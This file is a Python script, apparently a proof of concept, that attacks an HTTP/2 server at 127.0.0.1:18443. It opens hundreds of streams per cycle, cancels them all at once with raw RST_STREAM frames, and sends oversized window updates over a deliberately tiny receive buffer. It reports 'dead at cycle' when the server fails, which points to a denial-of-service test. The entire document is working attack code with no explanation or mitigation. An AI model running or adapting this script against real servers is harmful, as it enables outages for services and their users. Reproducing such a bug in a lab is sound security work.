import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "_vendor"))
import h2.connection, h2.config, socket, ssl, time

N = int(sys.argv[1]) if len(sys.argv) > 1 else 300
CYCLES = int(sys.argv[2]) if len(sys.argv) > 2 else 12
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])
s = ctx.wrap_socket(socket.create_connection(("127.0.0.1", 18443)), server_hostname="localhost")
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)

c = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
c.initiate_connection()
MAX = 2**31 - 1
c.update_settings({h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: MAX,
                   h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 5000})
s.sendall(c.data_to_send())

H = lambda: [(b":method", b"GET"), (b":path", b"/big.bin"),
             (b":scheme", b"https"), (b":authority", b"localhost")]


def wu(inc, sid=0):
    return bytes([0, 0, 4, 0x8, 0]) + sid.to_bytes(4, "big") + inc.to_bytes(4, "big")


sid = 3
for cyc in range(CYCLES):
    ids = []
    for _ in range(N):
        try:
            c.send_headers(sid, H(), end_stream=True)
            ids.append(sid)
            sid += 2
        except Exception:
            break
    try:
        s.sendall(c.data_to_send())
    except Exception:
        pass
    time.sleep(0.8)

    buf = b""
    for i in ids:
        buf += bytes([0, 0, 4, 0x3, 0]) + i.to_bytes(4, "big") + b"\x00\x00\x00\x00"
        if len(buf) > 16384:
            try:
                s.sendall(buf)
            except Exception:
                pass
            buf = b""
    if buf:
        try:
            s.sendall(buf)
        except Exception:
            pass
    time.sleep(0.8)

    try:
        s.sendall(wu(MAX // 4))
    except Exception:
        print("dead at cycle", cyc)
        break
    time.sleep(0.4)

print("cycles done")
